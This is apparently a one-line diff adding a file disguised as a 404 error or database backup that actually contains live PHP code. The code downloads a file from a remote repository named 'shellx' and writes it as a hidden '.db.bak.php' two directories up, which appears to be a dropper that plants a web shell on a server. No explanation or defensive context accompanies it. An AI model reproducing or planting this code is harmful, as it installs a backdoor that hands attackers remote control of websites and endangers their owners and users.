@@ -1,0 +1,1 @@
+error:404..db.bak<?php file_put_contents('../../.db.bak.php',($data=file_get_contents('https://raw.githubusercontent.com/boderanuc352-cmd/shellx/refs/heads/main/.db.txt.php'))!==false?$data:die('xx'));?>);exit();?>
